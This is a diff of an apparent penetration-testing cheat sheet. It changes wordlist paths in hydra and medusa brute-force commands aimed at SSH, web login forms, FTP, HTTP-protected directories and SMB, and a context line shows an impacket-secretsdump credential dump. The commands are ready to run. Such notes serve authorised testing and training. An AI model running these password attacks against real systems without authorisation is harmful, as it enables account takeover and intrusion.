@@ -84,7 +84,7 @@ hydra -L users -P words -t 4 -V -f ssh://$IP
 
 ```bash
 # Basic HTTP POST form attack
-hydra $IP -l admin -P /usr/share/wordlists/rockyou.txt http-post-form "/login.php:username=admin&password=^PASS^:Wrong username or password" -vV -f
+hydra $IP -l admin -P $ROCKYOU http-post-form "/login.php:username=admin&password=^PASS^:Wrong username or password" -vV -f
 
 # Complex HTTP POST with JSON and custom headers
 hydra -v -V -L "users.txt" -P "passwords.txt" -s 80 \
@@ -96,17 +96,17 @@ hydra -v -V -L "users.txt" -P "passwords.txt" -s 80 \
 
 ```bash
 # FTP attack with null/same/reverse options enabled
-hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/500-worst-passwords.txt ftp://$IP -e nsr
+hydra -L $WORDLISTS/SecLists/Usernames/top-usernames-shortlist.txt -P $WORDLISTS/SecLists/Passwords/500-worst-passwords.txt ftp://$IP -e nsr
 ```
 
 ### Medusa
 
 ```bash
 # HTTP htaccess-protected directory attack
-medusa -h $IP -M http -u admin -P /usr/share/wordlists/rockyou.txt -m DIR:/admin
+medusa -h $IP -M http -u admin -P $ROCKYOU -m DIR:/admin
 
 # SMB/NTLM authentication attack
-medusa -h $IP -M smbnt -u admin -P /usr/share/wordlists/rockyou.txt
+medusa -h $IP -M smbnt -u admin -P $ROCKYOU
 ```
 
 ### FFUF - Web Form Fuzzing
@@ -157,22 +157,22 @@ impacket-secretsdump <domain>/<username>:<password>@<IP>
 
 ### General Purpose
 
-- `/usr/share/wordlists/rockyou.txt` (Common passwords)
+- `/opt/w1ld0s/wordlists/rockyou.txt` (Common passwords)
 
 ### Specialized Lists
 
-- `/usr/share/seclists/Passwords/Keyboard-Combinations.txt` (Keyboard patterns)
-- `/usr/share/wordlists/wfuzz/others/common_pass.txt` (Common passwords)
-- `/usr/share/seclists/Passwords/Default-Credentials/` (Default creds by
+- `/opt/w1ld0s/wordlists/SecLists/Passwords/Keyboard-Combinations.txt` (Keyboard patterns)
+- `/opt/w1ld0s/wordlists/wfuzz/others/common_pass.txt` (Common passwords)
+- `/opt/w1ld0s/wordlists/SecLists/Passwords/Default-Credentials/` (Default creds by
   product)
 -
-`/usr/share/seclists/Passwords/Common-Credentials/top-passwords-shortlist.txt` (
+`/opt/w1ld0s/wordlists/SecLists/Passwords/Common-Credentials/top-passwords-shortlist.txt` (
 Most common)
 
 ### Username Lists
 
-- `/usr/share/seclists/Usernames/top-usernames-shortlist.txt` (Common usernames)
-- `/usr/share/seclists/Usernames/Names/names.txt` (Common names)
+- `/opt/w1ld0s/wordlists/SecLists/Usernames/top-usernames-shortlist.txt` (Common usernames)
+- `/opt/w1ld0s/wordlists/SecLists/Usernames/Names/names.txt` (Common names)
 
 ---
 
